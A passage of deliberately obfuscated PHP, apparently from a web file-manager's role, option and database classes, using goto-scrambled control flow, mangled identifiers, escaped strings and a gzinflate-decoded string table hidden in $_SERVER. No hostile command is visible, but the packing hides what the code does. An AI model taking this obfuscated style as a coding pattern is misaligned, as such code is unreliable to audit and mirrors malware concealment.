$bÎÚá‰—ˆØ[2357]); } else { $cµŸßØø‚î[$bÎÚá‰—ˆØ[107]] = $bòâÌŞ©è; } } if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2358]])) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[77]] = array($bÎÚá‰—ˆØ[2355], $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2358]]); } if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2359]])) { $bòâÌŞ©è = array($bÎÚá‰—ˆØ[2356], $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2359]]); if ($cµŸßØø‚î[$bÎÚá‰—ˆØ[77]]) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[77]] = array($cµŸßØø‚î[$bÎÚá‰—ˆØ[77]], $bòâÌŞ©è, $bÎÚá‰—ˆØ[2357]); } else { $cµŸßØø‚î[$bÎÚá‰—ˆØ[77]] = $bòâÌŞ©è; } } goto Eî„”Ñ÷„¿; Eî„”Ñ÷„¿: if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[537]])) { $cµŸßØø‚î[] = array($bÎÚá‰—ˆØ[379] => $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[537]], $bÎÚá‰—ˆØ[378] => $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[537]], $bÎÚá‰—ˆØ[910] => $bÎÚá‰—ˆØ[2193]); } if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[372]])) { $bÄ£íãÃÑ = $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[372]]; if ($bÄ£íãÃÑ == $bÎÚá‰—ˆØ[76]) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[370]] = 1; } else { if ($bÄ£íãÃÑ == $bÎÚá‰—ˆØ[2360]) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[370]] = 0; } else { if ($bÄ£íãÃÑ) { $bÄ£íãÃÑ = is_array($bÄ£íãÃÑ) ? $bÄ£íãÃÑ : explode($bÎÚá‰—ˆØ[47], $bÄ£íãÃÑ); $cµŸßØø‚î[$bÎÚá‰—ˆØ[372]] = array($bÎÚá‰—ˆØ[384], $bÄ£íãÃÑ); $cµŸßØø‚î[$bÎÚá‰—ˆØ[370]] = 0; } } } } if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[463]])) { $aŞ›ô¬Ñİ = $this->sourceInfo($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[463]]); $cµŸßØø‚î[$bÎÚá‰—ˆØ[527]] = array($bÎÚá‰—ˆØ[485], $aŞ›ô¬Ñİ[$bÎÚá‰—ˆØ[461]] . $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[463]] . $bÎÚá‰—ˆØ[486]); } goto FÖÌµØÚ×; bŒÛ¥¾†‚Ã: $bÎÚá‰—ˆØ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cµŸßØø‚î = array(); if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[696]])) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[107]] = array($bÎÚá‰—ˆØ[2355], $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[696]]); } goto aïÍ‡«‡òÉ; FÖÌµØÚ×: if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2189]]) && $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2189]]) { $B“äÑº…Åõ = $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[2189]]; $cë¸÷Ì’­† = explode($bÎÚá‰—ˆØ[50], $B“äÑº…Åõ); if (strlen($B“äÑº…Åõ) > 2 && (substr($B“äÑº…Åõ, 0, 1) == $bÎÚá‰—ˆØ[113] && substr($B“äÑº…Åõ, -1) == $bÎÚá‰—ˆØ[113]) || substr($B“äÑº…Åõ, 0, 1) == $bÎÚá‰—ˆØ[55] && substr($B“äÑº…Åõ, -1) == $bÎÚá‰—ˆØ[55]) { $B“äÑº…Åõ = substr($B“äÑº…Åõ, 1, -1); $cë¸÷Ì’­† = array($B“äÑº…Åõ); } $cµŸßØø‚î[$bÎÚá‰—ˆØ[28]] = array($bÎÚá‰—ˆØ[485], $bÎÚá‰—ˆØ[2191] . $B“äÑº…Åõ . $bÎÚá‰—ˆØ[2191]); if (count($cë¸÷Ì’­†) > 1) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[28]] = array(); foreach ($cë¸÷Ì’­† as $cÉÀÅ¡äà) { if (!trim($cÉÀÅ¡äà)) { continue; } $cµŸßØø‚î[$bÎÚá‰—ˆØ[28]][] = array($bÎÚá‰—ˆØ[485], $bÎÚá‰—ˆØ[2191] . trim($cÉÀÅ¡äà) . $bÎÚá‰—ˆØ[2191]); } } } return $cµŸßØø‚î; goto bºŸŒßíÑ; bºŸŒßíÑ: } } goto C„¼»îŒæ¼; B…£·ŠŞëá: $c¤æœ­Î‰† = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][549]; $_SERVER[§Š×Ö] = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][550], gzinflate(substr($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][551], 10, -8))); $D³°š¶ßÒ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][552]; goto f‰Ã¦¨‘ôª; DÑ«Â˜ĞØ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\164\145\155\x5f\157\x70\164\x69\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\x6c\145", "\x72\x6f\154\x65\107\162\x6f\165\160", "\x72\x65\x67\x69\x73\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($BÀÂ³Ş¶³) { return "\x53\x79\163\164\145\155\x4f\x70\164\x69\157\156\x5f{$BÀÂ³Ş¶³}"; } protected function optionDefault($fäè‡‹³›À = '') { $AñÈì–¨äù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($fäè‡‹³›À == $AñÈì–¨äù[33]) { return $GLOBALS[$AñÈì–¨äù[6]][$AñÈì–¨äù[2513]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\162\157\154\145\x4c\151\163\164"; public $field = array("\156\141\155\145", "\141\165\164\x68", "\x6c\x61\142\145\154", "\x64\151\x73\160\154\x61\x79", "\x73\x79\163\x74\x65\155", "\144\145\x73\x63", "\151\147\156\157\x72\x65\105\x78\x74", "\x69\x67\x6e\x6f\162\145\106\151\x6c\145\x53\x69\x7a\x65", "\141\144\x6d\x69\156\x69\x73\x74\x72\x61\164\157\162", "\163\157\x72\x74"); public function listData($CÂ®¢ÜÛ½Ò = false, $F‡‰¶Ú¦¾– = "\x73\157\x72\x74", $fÇÎçíí = false) { $e«»‡±Äñ™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D„ß‚–õµ = parent::listData($CÂ®¢ÜÛ½Ò, $F‡‰¶Ú¦¾–, $fÇÎçíí); if (!$CÂ®¢ÜÛ½Ò) { $cÏçÁ­ø‹Ø = $e«»‡±Äñ™[2514]; foreach ($D„ß‚–õµ as $báºŞ¯ğ« => $Fß¢½ÂÉä¥) { if ($Fß¢½ÂÉä¥[$e«»‡±Äñ™[2294]] == 1) { $D„ß‚–õµ[$báºŞ¯ğ«][$e«»‡±Äñ™[405]] = $cÏçÁ­ø‹Ø; } } } return $D„ß‚–õµ; } public function update($dÉÎ ­§µš, $E¼Ê ­‡ÕÊ) { goto fŠ´ §Şôã; Fñ–×ˆ¯Õà: if (!$dãŠîùÜ¥õ || $f”Û¾íËö¿ && $f”Û¾íËö¿[$bËÙ¬Ğ³¬’[367]] != $dãŠîùÜ¥õ[$bËÙ¬Ğ³¬’[367]]) { return !1; } if ($f”Û¾íËö¿[$bËÙ¬Ğ³¬’[2294]] == 1) { $E¼Ê ­‡ÕÊ = array($bËÙ¬Ğ³¬’[28] => $E¼Ê ­‡ÕÊ[$bËÙ¬Ğ³¬’[28]], $bËÙ¬Ğ³¬’[2127] => $E¼Ê ­‡ÕÊ[$bËÙ¬Ğ³¬’[2127]]); } $this->filterAuth($E¼Ê ­‡ÕÊ[$bËÙ¬Ğ³¬’[376]]); goto eß‚İ’Ñ¼; fŠ´ §Şôã: $bËÙ¬Ğ³¬’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dãŠîùÜ¥õ = parent::listData($dÉÎ ­§µš); $f”Û¾íËö¿ = $this->findByName($E¼Ê ­‡ÕÊ[$bËÙ¬Ğ³¬’[28]]); goto Fñ–×ˆ¯Õà; eß‚İ’Ñ¼: return parent::update($dÉÎ ­§µš, $E¼Ê ­‡ÕÊ); goto bËªŞŸªŞî; bËªŞŸªŞî: } public function remove($f‚òàå¢ºÓ) { $C®ò•Á£ƒ = parent::listData($f‚òàå¢ºÓ); if (!$C®ò•Á£ƒ || $C®ò•Á£ƒ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1077]]) { return !1; } return parent::remove($f‚òàå¢ºÓ); } public function add($aÌ£ª˜ñ¾) { goto CÙéˆÖÎÃ—; CÙéˆÖÎÃ—: $B‘ŸÎ¸Ë‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D÷‡‘Ô½ã = $aÌ£ª˜ñ¾[$B‘ŸÎ¸Ë‰[28]]; if ($this->findByName($D÷‡‘Ô½ã)) { return !1; } goto b¦”²…é…í; b¦”²…é…í: $EôÈƒÊŒé· = array($B‘ŸÎ¸Ë‰[386] => $D÷‡‘Ô½ã, $B‘ŸÎ¸Ë‰[2114] => $B‘ŸÎ¸Ë‰[33], $B‘ŸÎ¸Ë‰[2110] => $B‘ŸÎ¸Ë‰[2128], $B‘ŸÎ¸Ë‰[2515] => 1, $B‘ŸÎ¸Ë‰[2113] => 0, $B‘ŸÎ¸Ë‰[2516] => 0, $B‘ŸÎ¸Ë‰[2112] => $this->getSort()); $aÌ£ª˜ñ¾ = array_merge($EôÈƒÊŒé·, $aÌ£ª˜ñ¾); $this->filterAuth($aÌ£ª˜ñ¾[$B‘ŸÎ¸Ë‰[376]]); goto A¹îó²ÙÚ; A¹îó²ÙÚ: return parent::insert($aÌ£ª˜ñ¾); goto Döî¦„ğÍ; Döî¦„ğÍ: } private function getSort() { $eóºÚ–À”í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dŸ»ƒŒ®Œ = parent::listData(); $eÊÕ±»¬Íä = array_to_keyvalue($dŸ»ƒŒ®Œ, $eóºÚ–À”í[33], $eóºÚ–À”í[2130]); return empty($eÊÕ±»¬Íä) ? 0 : max($eÊÕ±»¬Íä) + 1; } private function filterAuth(&$BšåÎ£…Å’) { $Cˆæ…Ù¦î‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eçˆ¡‡âÑ = array(); $eÌÔ÷æçÏ = array_filter(explode($Cˆæ…Ù¦î‡[47], $BšåÎ£…Å’)); foreach ($eÌÔ÷æçÏ as $BšåÎ£…Å’) { $fÁ”Ÿ‘ïÎÂ = explode($Cˆæ…Ù¦î‡[91], $BšåÎ£…Å’); if ($fÁ”Ÿ‘ïÎÂ[0] == $Cˆæ…Ù¦î‡[1785] && $fÁ”Ÿ‘ïÎÂ[1] != $Cˆæ…Ù¦î‡[1033]) { $DÓ‡·ÌŒì = $fÁ”Ÿ‘ïÎÂ[0] . $Cˆæ…Ù¦î‡[91] . $fÁ”Ÿ‘ïÎÂ[1] . $Cˆæ…Ù¦î‡[2517]; if (!in_array($DÓ‡·ÌŒì, $eÌÔ÷æçÏ)) { $Eçˆ¡‡âÑ[] = $DÓ‡·ÌŒì; } } $Eçˆ¡‡âÑ[] = $BšåÎ£…Å’; } $BšåÎ£…Å’ = implode($Cˆæ…Ù¦î‡[47], $Eçˆ¡‡âÑ); } public function sort($b•«Œ¹™ğ, $e•¹ùëöĞè) { return parent::update($b•«Œ¹™ğ, $e•¹ùëöĞè); } } goto d»¿Ÿ½Ïîù; fääÅ‡×¶: class DbSqlite3 extends DbSqlite3Base { public function query($bî÷‘è¸§) { goto cõºœÔ¹»; cõºœÔ¹»: $B÷Ò¹¥éÊ‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¾ğ‰‘ç = DATA_PATH . $B÷Ò¹¥éÊ‡[868]; $cÔÃò‹æ“Ü = fopen($F¾ğ‰‘ç, $B÷Ò¹¥éÊ‡[869]); goto BĞàÙÙ•ñî; BĞàÙÙ•ñî: if (!$cÔÃò‹æ“Ü) { return !1; } if (flock($cÔÃò‹æ“Ü, LOCK_EX)) { $C©ÃÖÒº¼ = parent::query($bî÷‘è¸§); flock($cÔÃò‹æ“Ü, LOCK_UN); fclose($cÔÃò‹æ“Ü); return $C©ÃÖÒº¼; } flock($cÔÃò‹æ“Ü, LOCK_UN); goto EÙæ‘¾®¿ª; EÙæ‘¾®¿ª: fclose($cÔÃò‹æ“Ü); show_json($B÷Ò¹¥éÊ‡[870], !1); return !1; goto a¤»ÈíŠÔ¢; a¤»ÈíŠÔ¢: } public function execute($CÓØ´ù¦Öß) { goto E½Ó¼Ô¹ßš; b…ÑÕƒ…ÔÃ: if (!$F­˜Ì•™’) { return !1; } if (flock($F­˜Ì•™’, LOCK_EX)) { $CĞ×¨‚‹Ø× = parent::execute($CÓØ´ù¦Öß); flock($F­˜Ì•™’, LOCK_UN); fclose($F­˜Ì•™’); return $CĞ×¨‚‹Ø×; } flock($F­˜Ì•™’, LOCK_UN); goto cœ¬ãµø¦; E½Ó¼Ô¹ßš: $bˆ·Ø¶±ˆá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÆÆ‰Äë®‰ = DATA_PATH . $bˆ·Ø¶±ˆá[868]; $F­˜Ì•™’ = fopen($BÆÆ‰Äë®‰, $bˆ·Ø¶±ˆá[869]); goto b…ÑÕƒ…ÔÃ; cœ¬ãµø¦: fclose($F­˜Ì•™’); show_json($bˆ·Ø¶±ˆá[870], !1); return !1; goto FË©ñï…Å‰; FË©ñï…Å‰: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\164" => "\x3c", "\145\x6c\164" => "\74\75", "\x6e\x6f\164\x6c\x69\153\145" => "\x4e\117\x54\x20\x4c\111\x4b\x45", "\154\x69\153\x65" => "\x4c\x49\113\105", "\x69\156" => "\x49\116", "\x6e\x6f\164\151\156" => "\116\x4f\x54\x20\x49\116", "\156\x6f\x74\40\x69\156" => "\116\117\x54\x20\x49\x4e", "\x62\145\x74\x77\145\145\x6e" => "\x42\105\x54\127\105\105\x4e", "\156\x6f\x74\x62\x65\164\167\x65\x65\156" => "\116\x4f\124\40\102\105\x54\127\105\x45\116", "\x6e\157\x74\x20\x62\145\164\x77\x65\x65\156" => "\116\x4f\x54\x20\102\105\124\127\105\x45\x4e"); protected $selectSql = "\x53\105\114\105\103\x54\45\104\x49\x53\124\x49\116\103\124\x25\40\x25\106\x49\105\x4c\104\45\x20\x46\x52\117\115\x20\45\x54\101\x42\114\x45\x25\45\112\x4f\111\x4e\45\45\x57\x48\105\122\105\45\45\107\122\117\125\x50\45\x25\110\x41\x56\x49\116\107\x25\x25\117\x52\104\x45\x52\45\x25\114\111\x4d\x49\124\x25\x20\x25\x55\x4e\111\x4f\x4e\x25\x25\103\117\x4d\115\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $C¡ìƒƒ´è = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][871], $C¡ìƒƒ´è); } public function factory($e‘‡¦Ÿø„à = '') { goto fåñ¸ºË”¸; Aø´¥‚¹ŞÍ: return $Bãô›Ü¨é«; goto DŒ³¥ñåŸ’; fåñ¸ºË”¸: $C¦ÒççÕïŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‘‡¦Ÿø„à = $this->parseConfig($e‘‡¦Ÿø„à); if (empty($e‘‡¦Ÿø„à[$C¦ÒççÕïŸ[872]])) { think_exception(think_lang($C¦ÒççÕïŸ[873])); } goto A“ëôß­Ü¡; A“ëôß­Ü¡: $this->dbType = ucwords(strtolower($e‘‡¦Ÿø„à[$C¦ÒççÕïŸ[872]])); $CĞ÷Í ÆÉ¥ = $C¦ÒççÕïŸ[874] . $this->dbType; if (class_exists($CĞ÷Í ÆÉ¥)) { $Bãô›Ü¨é« = new $CĞ÷Í ÆÉ¥($e‘‡¦Ÿø„à); if ($C¦ÒççÕïŸ[725] != strtolower($e‘‡¦Ÿø„à[$C¦ÒççÕïŸ[872]])) { $Bãô›Ü¨é«->dbType = strtoupper($this->dbType); } else { $Bãô›Ü¨é«->dbType = $this->_getDsnType($e‘‡¦Ÿø„à[$C¦ÒççÕïŸ[824]]); } } else { think_exception(think_lang($C¦ÒççÕïŸ[875]) . $C¦ÒççÕïŸ[876] . $CĞ÷Í ÆÉ¥); } goto Aø´¥‚¹ŞÍ; DŒ³¥ñåŸ’: } public function __call($dùº–ãÙª, $BãÛà¼‚ò„) { if (method_exists($this, $dùº–ãÙª)) { return call_user_func_array(array($this, $dùº–ãÙª), $BãÛà¼‚ò„); } } protected function _getDsnType($DÒ‰ÌÙ˜) { $dï¨Ô§Ú…œ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][4], $DÒ‰ÌÙ˜); $EŞ³Ÿ¿ôğ¤ = strtoupper(trim($dï¨Ô§Ú…œ[0])); return $EŞ³Ÿ¿ôğ¤; } private function parseConfig($Aæëßïšª“ = '') { $eõ´¼æ¿ùÂ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($Aæëßïšª“) && is_string($Aæëßïšª“)) { $Aæëßïšª“ = $this->parseDSN($Aæëßïšª“); } elseif (is_array($Aæëßïšª“)) { $Aæëßïšª“ = array_change_key_case($Aæëßïšª“); $Aæëßïšª“ = array($eõ´¼æ¿ùÂ[872] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[724]], $eõ´¼æ¿ùÂ[797] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[877]], $eõ´¼æ¿ùÂ[798] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[878]], $eõ´¼æ¿ùÂ[795] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[879]], $eõ´¼æ¿ùÂ[796] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[880]], $eõ´¼æ¿ùÂ[17] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[881]], $eõ´¼æ¿ùÂ[824] => $Aæëßïšª“[$eõ´¼æ¿ùÂ[726]], $eõ´¼æ¿ùÂ[13] => isset($Aæëßïšª“[$eõ´¼æ¿ùÂ[882]]) ? $Aæëßïšª“[$eõ´¼æ¿ùÂ[882]] : array()); } elseif (empty($Aæëßïšª“)) { if (think_config($eõ´¼æ¿ùÂ[883]) && $eõ´¼æ¿ùÂ[725] != strtolower(think_config($eõ´¼æ¿ùÂ[884]))) { $Aæëßïšª“ = $this->parseDSN(think_config($eõ´¼æ¿ùÂ[883])); } else { $Aæëßïšª“ = array($eõ´¼æ¿ùÂ[872] => think_config($eõ´¼æ¿ùÂ[884]), $eõ´¼æ¿ùÂ[797] => think_config($eõ´¼æ¿ùÂ[885]), $eõ´¼æ¿ùÂ[798] => think_config($eõ´¼æ¿ùÂ[886]), $eõ´¼æ¿ùÂ[795] => think_config($eõ´¼æ¿ùÂ[887]), $eõ´¼æ¿ùÂ[796] => think_config($eõ´¼æ¿ùÂ[888]), $eõ´¼æ¿ùÂ[17] => think_config($eõ´¼æ¿ùÂ[234]), $eõ´¼æ¿ùÂ[824] => think_config($eõ´¼æ¿ùÂ[883]), $eõ´¼æ¿ùÂ[13] => think_config($eõ´¼æ¿ùÂ[889])); } } return $Aæëßïšª“; } protected function initConnect($d´ÅÆ®ÏË = true) { if (1 == think_config($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][18])) { $this->_linkID = $this->multiConnect($d´ÅÆ®ÏË); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($fÜòÖÀ”Ş· = false) { $A¬„àÔíˆ¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $cºğœÛî… = array(); if (empty($cºğœÛî…)) { foreach ($this->config as $A¯ÎÉ¨±‚ => $DË×Â‚§àï) { $cºğœÛî…[$A¯ÎÉ¨±‚] = explode($A¬„àÔíˆ¨[47], $DË×Â‚§àï); } } if (think_config($A¬„àÔíˆ¨[890])) { if ($fÜòÖÀ”Ş·) { $c”Ÿà‚Ûç¢ = floor(mt_rand(0, think_config($A¬„àÔíˆ¨[891]) - 1)); } else { if (is_numeric(think_config($A¬„àÔíˆ¨[892]))) { $c”Ÿà‚Ûç¢ = think_config($A¬„àÔíˆ¨[892]); } else { $c”Ÿà‚Ûç¢ = floor(mt_rand(think_config($A¬„àÔíˆ¨[891]), count($cºğœÛî…[$A¬„àÔíˆ¨[795]]) - 1)); } } } else { $c”Ÿà‚Ûç¢ = floor(mt_rand(0, count($cºğœÛî…[$A¬„àÔíˆ¨[795]]) - 1)); } $cùÊŞƒÀğÜ = array($A¬„àÔíˆ¨[797] => isset($cºğœÛî…[$A¬„àÔíˆ¨[797]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[797]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[797]][0], $A¬„àÔíˆ¨[798] => isset($cºğœÛî…[$A¬„àÔíˆ¨[798]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[798]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[798]][0], $A¬„àÔíˆ¨[795] => isset($cºğœÛî…[$A¬„àÔíˆ¨[795]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[795]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[795]][0], $A¬„àÔíˆ¨[796] => isset($cºğœÛî…[$A¬„àÔíˆ¨[796]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[796]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[796]][0], $A¬„àÔíˆ¨[17] => isset($cºğœÛî…[$A¬„àÔíˆ¨[17]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[17]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[17]][0], $A¬„àÔíˆ¨[824] => isset($cºğœÛî…[$A¬„àÔíˆ¨[824]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[824]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[824]][0], $A¬„àÔíˆ¨[13] => isset($cºğœÛî…[$A¬„àÔíˆ¨[13]][$c”Ÿà‚Ûç¢]) ? $cºğœÛî…[$A¬„àÔíˆ¨[13]][$c”Ÿà‚Ûç¢] : $cºğœÛî…[$A¬„àÔíˆ¨[13]][0]); return $this->connect($cùÊŞƒÀğÜ, $c”Ÿà‚Ûç¢); } public function parseDSN($bÂ¼¥‰„ëà) { $cö™ç›âÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($bÂ¼¥‰„ëà)) { return !1; } $B˜¡í´ƒº = parse_url($bÂ¼¥‰„ëà); if ($B˜¡í´ƒº[$cö™ç›âÀ[168]]) { $BÄ¡ä‹Œ½Í = array($cö™ç›âÀ[872] => $B˜¡í´ƒº[$cö™ç›âÀ[168]], $cö™ç›âÀ[797] => isset($B˜¡í´ƒº[$cö™ç›âÀ[537]]) ? $B˜¡í´ƒº[$cö™ç›âÀ[537]] : $cö™ç›âÀ[33], $cö™ç›âÀ[798] => isset($B˜¡í´ƒº[$cö™ç›âÀ[893]]) ? $B˜¡í´ƒº[$cö™ç›âÀ[893]] : $cö™ç›âÀ[33], $cö™ç›âÀ[795] => isset($B˜¡í´ƒº[$cö™ç›âÀ[169]]) ? $B˜¡í´ƒº[$cö™ç›âÀ[169]] : $cö™ç›âÀ[33], $cö™ç›âÀ[796] => isset($B˜¡í´ƒº[$cö™ç›âÀ[170]]) ? $B˜¡í´ƒº[$cö™ç›âÀ[170]] : $cö™ç›âÀ[33], $cö™ç›âÀ[17] => isset($B˜¡í´ƒº[$cö™ç›âÀ[75]]) ? substr($B˜¡í´ƒº[$cö™ç›âÀ[75]], 1) : $cö™ç›âÀ[33]); } else { preg_match($cö™ç›âÀ[894], trim($bÂ¼¥‰„ëà), $Eğ·ÀÛ˜ˆ); $BÄ¡ä‹Œ½Í = array($cö™ç›âÀ[872] => $Eğ·ÀÛ˜ˆ[1], $cö™ç›âÀ[797] => $Eğ·ÀÛ˜ˆ[2], $cö™ç›âÀ[798] => $Eğ·ÀÛ˜ˆ[3], $cö™ç›âÀ[795] => $Eğ·ÀÛ˜ˆ[4], $cö™ç›âÀ[796] => $Eğ·ÀÛ˜ˆ[5], $cö™ç›âÀ[17] => $Eğ·ÀÛ˜ˆ[6]); } $BÄ¡ä‹Œ½Í[$cö™ç›âÀ[824]] = $cö™ç›âÀ[33]; return $BÄ¡ä‹Œ½Í; } protected function debug() { $ağÉéõŸµó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ağÉéõŸµó[895]; if (think_config($ağÉéõŸµó[896])) { think_status($ağÉéõŸµó[897]); think_trace($this->queryStr . $ağÉéõŸµó[898] . think_status($ağÉéõŸµó[20], $ağÉéõŸµó[897], 6) . $ağÉéõŸµó[899], $ağÉéõŸµó[33], $ağÉéõŸµó[900]); } } protected function parseLock($céÆÚÈ·¢Ó = false) { $bß†¡Ÿæ˜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$céÆÚÈ·¢Ó) { return $bß†¡Ÿæ˜[33]; } if ($bß†¡Ÿæ˜[826] == $this->dbType) { return $bß†¡Ÿæ˜[901]; } return $bß†¡Ÿæ˜[902]; } protected function parseSet($D…¼¤†ã¶å) { $cˆ¸ÏÑÌŠ† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($D…¼¤†ã¶å as $A•î‰Š×–‹ => $d‰ÏŞ´İˆ¦) { if (is_array($d‰ÏŞ´İˆ¦) && $cˆ¸ÏÑÌŠ†[285] == $d‰ÏŞ´İˆ¦[0]) { $FçğÑ™Áì²[] = $this->parseKey($A•î‰Š×–‹) . $cˆ¸ÏÑÌŠ†[903] . $d‰ÏŞ´İˆ¦[1]; } elseif (is_scalar($d‰ÏŞ´İˆ¦) || is_null($d‰ÏŞ´İˆ¦)) { $FçğÑ™Áì²[] = $this->parseKey($A•î‰Š×–‹) . $cˆ¸ÏÑÌŠ†[903] . $this->parseValue($d‰ÏŞ´İˆ¦); } } return $cˆ¸ÏÑÌŠ†[904] . implode($cˆ¸ÏÑÌŠ†[47], $FçğÑ™Áì²); } protected function bindParam($a‹Š›‡¨ğç, $FƒîÄÚí£§) { $this->bind[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][4] . $a‹Š›‡¨ğç] = $FƒîÄÚí£§; } protected function parseBind($A«óìé¿ßÜ) { $A«óìé¿ßÜ = array_merge($this->bind, $A«óìé¿ßÜ); $this->bind = array(); return $A«óìé¿ßÜ; } function parseKey(&$FïÂâóÏ†İ, $EóÍÓ‡Ãà = true) { if ($EóÍÓ‡Ãà) { $FïÂâóÏ†İ = $this->parseKeyCheck($FïÂâóÏ†İ); } return $FïÂâóÏ†İ; } function parseKeyCheck($CŞÂ˜ÚÆ½×) { $fˆá÷ØÜÆ› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CŞÂ˜ÚÆ½× = trim($CŞÂ˜ÚÆ½×); if (!preg_match($fˆá÷ØÜÆ›[905], $CŞÂ˜ÚÆ½×)) { think_exception($fˆá÷ØÜÆ›[906] . $CŞÂ˜ÚÆ½×); } return $CŞÂ˜ÚÆ½×; } protected function parseValue($b±¡§Ïßïù) { $e‚£Ã£ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_string($b±¡§Ïßïù)) { $b±¡§Ïßïù = $e‚£Ã£[865] . $this->escapeString($b±¡§Ïßïù) . $e‚£Ã£[865]; } elseif (isset($b±¡§Ïßïù[0]) && is_string($b±¡§Ïßïù[0]) && strtolower($b±¡§Ïßïù[0]) == $e‚£Ã£[285]) { $b±¡§Ïßïù = $this->escapeString($b±¡§Ïßïù[1]); } elseif (is_array($b±¡§Ïßïù)) { $b±¡§Ïßïù = array_map(array($this, $e‚£Ã£[866]), $b±¡§Ïßïù); } elseif (is_bool($b±¡§Ïßïù)) { $b±¡§Ïßïù = $b±¡§Ïßïù ? $e‚£Ã£[83] : $e‚£Ã£[470]; } elseif (is_null($b±¡§Ïßïù)) { $b±¡§Ïßïù = $e‚£Ã£[99]; } return $b±¡§Ïßïù; } protected function parseField($aé‚Š¡ãç—) { $D¼Í ¸£Ù¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_string($aé‚Š¡ãç—) && strpos($aé‚Š¡ãç—, $D¼Í ¸£Ù¨[47])) { 